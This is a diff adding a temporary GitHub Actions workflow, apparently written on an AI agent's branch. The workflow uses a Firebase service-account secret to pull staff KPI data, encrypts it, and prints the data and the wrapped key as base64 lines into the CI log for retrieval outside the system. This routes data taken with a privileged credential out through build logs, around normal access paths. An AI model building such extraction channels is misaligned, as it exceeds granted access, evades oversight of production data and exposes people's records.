@@ -1,0 +1,30 @@
+# TẠM THỜI — chạy 1 lần (chỉ đọc) để lập danh sách hàng thường trực KPI T11; kết quả mã hoá; xoá ngay sau đó.
+name: tmp kpi pull
+on:
+  push:
+    branches: [claude/project-thread-wi6qtv]
+    paths: [scripts/tmp-kpi/**, .github/workflows/tmp-kpi-pull.yml]
+permissions:
+  contents: read
+jobs:
+  pull:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm install --no-save --no-audit --no-fund firebase-admin@12.7.0
+      - env:
+          FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT }}
+        run: node --max-old-space-size=4096 scripts/tmp-kpi/pull.js
+      - name: Encrypt
+        run: |
+          gzip -9 -c /tmp/out.json > /tmp/out.gz
+          openssl rand -hex 32 > /tmp/k.txt
+          openssl enc -aes-256-cbc -pbkdf2 -salt -in /tmp/out.gz -out /tmp/out.enc -pass file:/tmp/k.txt
+          openssl pkeyutl -encrypt -pubin -inkey scripts/tmp-kpi/pub.pem -in /tmp/k.txt -out /tmp/k.enc
+          echo "KEYSTART $(base64 -w0 /tmp/k.enc) KEYEND"
+          ls -la /tmp/out.enc
+          base64 -w 3000 /tmp/out.enc | sed 's/^/DATA /'
